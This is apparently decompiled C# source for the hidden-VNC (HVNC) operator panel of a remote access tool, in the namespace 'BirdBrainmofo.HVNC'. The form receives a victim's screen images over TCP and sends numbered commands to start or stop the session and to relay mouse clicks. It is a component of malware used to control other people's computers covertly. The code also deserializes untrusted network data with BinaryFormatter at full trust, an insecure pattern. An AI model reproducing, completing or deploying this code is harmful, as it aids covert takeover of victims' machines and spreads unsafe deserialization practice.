using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Timer = System.Windows.Forms.Timer;

namespace BirdBrainmofo.HVNC
{
	// Token: 0x02000086 RID: 134
	public class GForm0 : Form
	{
		// Token: 0x06000695 RID: 1685 RVA: 0x00030048 File Offset: 0x0002E248
		public GForm0(TcpClient client)
		{
			GForm0 _this = this;
			bool_0 = true;
			ThreadStart thread = new ThreadStart(delegate
			{
				remotedeskt(client);
			});
			thread.Invoke();
			InitializeComponent();
		}

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        // Token: 0x060006A9 RID: 1705 RVA: 0x00030408 File Offset: 0x0002E608
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            BirdBrainmofo.Bloom bloom1 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom2 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom3 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom4 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom5 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom6 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom7 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom8 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom9 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom10 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom11 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom12 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom13 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom14 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom15 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom16 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom17 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom18 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom19 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom20 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom21 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom22 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom23 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom24 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom25 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom26 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom27 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom28 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom29 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom30 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom31 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom32 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom33 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom34 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom35 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom36 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom37 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom38 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom39 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom40 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom41 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom42 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom43 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom44 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom45 = new BirdBrainmofo.Bloom();
            this.btn_StartRD = new BirdBrainmofo.PrimeButton();
            this.btn_StopRD = new BirdBrainmofo.PrimeButton();
            this.primeTheme1 = new BirdBrainmofo.PrimeTheme();
            this.label4 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.checkBox_Keyboard = new JCS.ToggleSwitch();
            this.label2 = new System.Windows.Forms.Label();
            this.checkBox_Mouse = new JCS.ToggleSwitch();
            this.label1 = new System.Windows.Forms.Label();
            this.pbx_remoteDesk = new System.Windows.Forms.PictureBox();
            this.studioButton5 = new BirdBrainmofo.StudioButton();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.primeTheme1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbx_remoteDesk)).BeginInit();
            this.SuspendLayout();
            // 
            // btn_StartRD
            // 
            this.btn_StartRD.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            bloom1.Name = "DownGradient1";
            bloom1.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom2.Name = "DownGradient2";
            bloom2.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom3.Name = "NoneGradient1";
            bloom3.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom4.Name = "NoneGradient2";
            bloom4.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom5.Name = "NoneGradient3";
            bloom5.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom6.Name = "NoneGradient4";
            bloom6.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom7.Name = "Glow";
            bloom7.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom8.Name = "TextShade";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Text";
            bloom9.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom10.Name = "Border1";
            bloom10.Value = System.Drawing.Color.White;
            bloom11.Name = "Border2";
            bloom11.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.btn_StartRD.Colors = new BirdBrainmofo.Bloom[] {
        bloom1,
        bloom2,
        bloom3,
        bloom4,
        bloom5,
        bloom6,
        bloom7,
        bloom8,
        bloom9,
        bloom10,
        bloom11};
            this.btn_StartRD.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btn_StartRD.Font = new System.Drawing.Font("Verdana", 8F);
            this.btn_StartRD.Image = null;
            this.btn_StartRD.Location = new System.Drawing.Point(29, 409);
            this.btn_StartRD.Name = "btn_StartRD";
            this.btn_StartRD.NoRounding = false;
            this.btn_StartRD.Size = new System.Drawing.Size(111, 36);
            this.btn_StartRD.TabIndex = 0;
            this.btn_StartRD.Text = "Start";
            this.btn_StartRD.Transparent = false;
            this.btn_StartRD.Click += new System.EventHandler(this.btn_StartRD_Click);
            // 
            // btn_StopRD
            // 
            this.btn_StopRD.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            bloom12.Name = "DownGradient1";
            bloom12.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom13.Name = "DownGradient2";
            bloom13.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom14.Name = "NoneGradient1";
            bloom14.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom15.Name = "NoneGradient2";
            bloom15.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom16.Name = "NoneGradient3";
            bloom16.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom17.Name = "NoneGradient4";
            bloom17.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom18.Name = "Glow";
            bloom18.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom19.Name = "TextShade";
            bloom19.Value = System.Drawing.Color.White;
            bloom20.Name = "Text";
            bloom20.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom21.Name = "Border1";
            bloom21.Value = System.Drawing.Color.White;
            bloom22.Name = "Border2";
            bloom22.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.btn_StopRD.Colors = new BirdBrainmofo.Bloom[] {
        bloom12,
        bloom13,
        bloom14,
        bloom15,
        bloom16,
        bloom17,
        bloom18,
        bloom19,
        bloom20,
        bloom21,
        bloom22};
            this.btn_StopRD.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btn_StopRD.Font = new System.Drawing.Font("Verdana", 8F);
            this.btn_StopRD.Image = null;
            this.btn_StopRD.Location = new System.Drawing.Point(29, 451);
            this.btn_StopRD.Name = "btn_StopRD";
            this.btn_StopRD.NoRounding = false;
            this.btn_StopRD.Size = new System.Drawing.Size(111, 36);
            this.btn_StopRD.TabIndex = 1;
            this.btn_StopRD.Text = "Stop";
            this.btn_StopRD.Transparent = false;
            this.btn_StopRD.Click += new System.EventHandler(this.btn_StopRD_Click);
            // 
            // primeTheme1
            // 
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom23.Name = "Sides";
            bloom23.Value = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(232)))), ((int)(((byte)(232)))));
            bloom24.Name = "Gradient1";
            bloom24.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom25.Name = "Gradient2";
            bloom25.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom26.Name = "TextShade";
            bloom26.Value = System.Drawing.Color.White;
            bloom27.Name = "Text";
            bloom27.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom28.Name = "Back";
            bloom28.Value = System.Drawing.Color.White;
            bloom29.Name = "Border1";
            bloom29.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            bloom30.Name = "Border2";
            bloom30.Value = System.Drawing.Color.White;
            bloom31.Name = "Border3";
            bloom31.Value = System.Drawing.Color.White;
            bloom32.Name = "Border4";
            bloom32.Value = System.Drawing.Color.FromArgb(((int)(((byte)(150)))), ((int)(((byte)(150)))), ((int)(((byte)(150)))));
            this.primeTheme1.Colors = new BirdBrainmofo.Bloom[] {
        bloom23,
        bloom24,
        bloom25,
        bloom26,
        bloom27,
        bloom28,
        bloom29,
        bloom30,
        bloom31,
        bloom32};
            this.primeTheme1.Controls.Add(this.label4);
            this.primeTheme1.Controls.Add(this.label10);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.checkBox_Keyboard);
            this.primeTheme1.Controls.Add(this.label2);
            this.primeTheme1.Controls.Add(this.checkBox_Mouse);
            this.primeTheme1.Controls.Add(this.label1);
            this.primeTheme1.Controls.Add(this.pbx_remoteDesk);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.btn_StopRD);
            this.primeTheme1.Controls.Add(this.btn_StartRD);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8F);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(968, 581);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 2;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(332, 13);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(41, 13);
            this.label4.TabIndex = 74;
            this.label4.Text = "label4";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(32, 386);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(0, 13);
            this.label10.TabIndex = 73;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(39, 15);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(120, 13);
            this.label3.TabIndex = 72;
            this.label3.Text = "REMOTE DESKTOP";
            // 
            // checkBox_Keyboard
            // 
            this.checkBox_Keyboard.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.checkBox_Keyboard.BackColor = System.Drawing.Color.Transparent;
            this.checkBox_Keyboard.Location = new System.Drawing.Point(29, 526);
            this.checkBox_Keyboard.Name = "checkBox_Keyboard";
            this.checkBox_Keyboard.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkBox_Keyboard.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkBox_Keyboard.Size = new System.Drawing.Size(50, 19);
            this.checkBox_Keyboard.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.checkBox_Keyboard.TabIndex = 69;
            // 
            // label2
            // 
            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Location = new System.Drawing.Point(85, 532);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(62, 13);
            this.label2.TabIndex = 70;
            this.label2.Text = "Keyboard";
            // 
            // checkBox_Mouse
            // 
            this.checkBox_Mouse.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.checkBox_Mouse.BackColor = System.Drawing.Color.Transparent;
            this.checkBox_Mouse.Location = new System.Drawing.Point(29, 501);
            this.checkBox_Mouse.Name = "checkBox_Mouse";
            this.checkBox_Mouse.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkBox_Mouse.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkBox_Mouse.Size = new System.Drawing.Size(50, 19);
            this.checkBox_Mouse.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.checkBox_Mouse.TabIndex = 67;
            // 
            // label1
            // 
            this.label1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Location = new System.Drawing.Point(85, 507);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(43, 13);
            this.label1.TabIndex = 68;
            this.label1.Text = "Mouse";
            // 
            // pbx_remoteDesk
            // 
            this.pbx_remoteDesk.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.pbx_remoteDesk.BackColor = System.Drawing.Color.Gainsboro;
            this.pbx_remoteDesk.Location = new System.Drawing.Point(155, 37);
            this.pbx_remoteDesk.Name = "pbx_remoteDesk";
            this.pbx_remoteDesk.Size = new System.Drawing.Size(794, 527);
            this.pbx_remoteDesk.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbx_remoteDesk.TabIndex = 41;
            this.pbx_remoteDesk.TabStop = false;
            this.pbx_remoteDesk.Click += new System.EventHandler(this.pbx_remoteDesk_Click);
            this.pbx_remoteDesk.MouseClick += new System.Windows.Forms.MouseEventHandler(this.pbx_remoteDesk_MouseClick);
            this.pbx_remoteDesk.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.pbx_remoteDesk_MouseDoubleClick);
            // 
            // studioButton5
            // 
            this.studioButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom33.Name = "DownGradient1";
            bloom33.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom34.Name = "DownGradient2";
            bloom34.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom35.Name = "NoneGradient1";
            bloom35.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom36.Name = "NoneGradient2";
            bloom36.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom37.Name = "Shine1";
            bloom37.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom38.Name = "Shine2A";
            bloom38.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom39.Name = "Shine2B";
            bloom39.Value = System.Drawing.Color.Transparent;
            bloom40.Name = "Shine3";
            bloom40.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom41.Name = "TextShade";
            bloom41.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom42.Name = "Text";
            bloom42.Value = System.Drawing.Color.White;
            bloom43.Name = "Glow";
            bloom43.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom44.Name = "Border";
            bloom44.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom45.Name = "Corners";
            bloom45.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton5.Colors = new BirdBrainmofo.Bloom[] {
        bloom33,
        bloom34,
        bloom35,
        bloom36,
        bloom37,
        bloom38,
        bloom39,
        bloom40,
        bloom41,
        bloom42,
        bloom43,
        bloom44,
        bloom45};
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(942, -7);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 40;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(this.studioButton5_Click);
            // 
            // timer1
            // 
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // GForm0
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(968, 581);
            this.Controls.Add(this.primeTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "GForm0";
            this.Text = "RD";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.RD_Load);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbx_remoteDesk)).EndInit();
            this.ResumeLayout(false);

        }

        // Token: 0x040003B6 RID: 950
        private IContainer components = null;

        // Token: 0x040003B7 RID: 951
        private PrimeButton btn_StartRD;

        // Token: 0x040003B8 RID: 952
        private PrimeButton btn_StopRD;

        // Token: 0x040003B9 RID: 953
        private PrimeTheme primeTheme1;

        // Token: 0x040003BA RID: 954
        private StudioButton studioButton5;

        // Token: 0x040003BB RID: 955
        private PictureBox pbx_remoteDesk;

        // Token: 0x040003BC RID: 956
        private JCS.ToggleSwitch checkBox_Keyboard;

        // Token: 0x040003BD RID: 957
        private Label label2;

        // Token: 0x040003BE RID: 958
        private JCS.ToggleSwitch checkBox_Mouse;

        // Token: 0x040003BF RID: 959
        private Label label1;

        // Token: 0x040003C1 RID: 961
        private Label label3;

        // Token: 0x040003C2 RID: 962
        private Timer timer1;

        // Token: 0x040003C3 RID: 963
        private Label label10;

        // Token: 0x040003C4 RID: 964
        private Label label4;

        // Token: 0x06000696 RID: 1686 RVA: 0x0000984F File Offset: 0x00007A4F
        private void studioButton5_Click(object sender, EventArgs e)
		{
			Close();
		}

		// Token: 0x06000697 RID: 1687 RVA: 0x00009D64 File Offset: 0x00007F64
		private void RD_Load(object sender, EventArgs e)
		{
			timer1.Start();
		}

		// Token: 0x06000698 RID: 1688 RVA: 0x00009D71 File Offset: 0x00007F71
		private void timer1_Tick(object sender, EventArgs e)
		{
        }

		// Token: 0x06000699 RID: 1689 RVA: 0x000063EF File Offset: 0x000045EF
		private void RD_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600069A RID: 1690 RVA: 0x000063EF File Offset: 0x000045EF
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600069B RID: 1691 RVA: 0x00009D84 File Offset: 0x00007F84
		private void RD_FormClosing(object sender, FormClosingEventArgs e)
		{
			Hide();
			e.Cancel = true;
			expand_RD = false;
		}

		// Token: 0x0600069C RID: 1692 RVA: 0x000063EF File Offset: 0x000045EF
		private void pictureBox1_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600069D RID: 1693 RVA: 0x000063EF File Offset: 0x000045EF
		private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600069E RID: 1694 RVA: 0x000063EF File Offset: 0x000045EF
		private void pbx_remoteDesk_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600069F RID: 1695 RVA: 0x00009D9A File Offset: 0x00007F9A
		private void pbx_remoteDesk_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			sendDoubleMouseClick(e.X, e.Y, pbx_remoteDesk.Width, pbx_remoteDesk.Height);
		}

		// Token: 0x060006A0 RID: 1696 RVA: 0x000300AC File Offset: 0x0002E2AC
		public void sendMouseClick(int int_2, int int_3, int width, int height)
		{
			if (checkBox_Mouse.Checked)
			{
				int num = width;
				int num2 = height;
				label10.Text = int_2 + " , " + int_3;
				string.Concat(int_2.ToString(), ",", int_3.ToString(), ",", num.ToString(), "_", num2.ToString());
				SendTCP("2071*" + Conversions.ToString(false), (TcpClient)Tag);
			}
		}

		// Token: 0x060006A1 RID: 1697 RVA: 0x000063EF File Offset: 0x000045EF
		private void pbx_remoteDesk_MouseMove(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x060006A2 RID: 1698 RVA: 0x00030160 File Offset: 0x0002E360
		public void sendDoubleMouseClick(int int_2, int int_3, int width, int height)
		{
			if (checkBox_Mouse.Checked)
			{
				int num = width;
				int num2 = height;
				label10.Text = int_2 + " , " + int_3;
				string.Concat(int_2.ToString(), ",", int_3.ToString(), ",", num.ToString(), "_", num2.ToString());
				SendTCP("2072*" + Conversions.ToString(false), (TcpClient)Tag);
			}
		}

		// Token: 0x060006A3 RID: 1699 RVA: 0x00030214 File Offset: 0x0002E414
		public void remotedeskt(TcpClient client)
		{
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			while (client.Connected && bool_0)
			{
				NetworkStream stream = client.GetStream();
				pbx_remoteDesk.Image = (Image)binaryFormatter.Deserialize(stream);
			}
		}

		// Token: 0x060006A4 RID: 1700 RVA: 0x00030258 File Offset: 0x0002E458
		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060006A5 RID: 1701 RVA: 0x00030334 File Offset: 0x0002E534
		private void btn_StartRD_Click(object sender, EventArgs e)
		{
			bool_0 = true;
			btn_StartRD.Enabled = false;
			btn_StopRD.Enabled = true;
			SendTCP("2069*" + Conversions.ToString(false), (TcpClient)Tag);
			ThreadStart thread = new ThreadStart(delegate
			{
				remotedeskt((TcpClient)Tag);
			});
			thread.Invoke();
		}

		// Token: 0x060006A6 RID: 1702 RVA: 0x0003039C File Offset: 0x0002E59C
		private void btn_StopRD_Click(object sender, EventArgs e)
		{
			btn_StopRD.Enabled = false;
			btn_StartRD.Enabled = true;
			bool_0 = false;
			SendTCP("2070*" + Conversions.ToString(false), (TcpClient)Tag);
			pbx_remoteDesk.Image = null;
			pbx_remoteDesk.BackColor = Color.Black;
		}

		// Token: 0x060006A7 RID: 1703 RVA: 0x000063EF File Offset: 0x000045EF
		private void pbx_remoteDesk_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x040003AE RID: 942
		public int int_0;

		// Token: 0x040003AF RID: 943
		public int int_1;

		// Token: 0x040003B0 RID: 944
		public int width;

		// Token: 0x040003B1 RID: 945
		public int height;

		// Token: 0x040003B2 RID: 946
		public bool expand_RD;

		// Token: 0x040003B3 RID: 947
		private bool bool_0;

		// Token: 0x040003B4 RID: 948
		private string selectedClient;

		// Token: 0x040003B5 RID: 949
		public Image screen;
	}
}
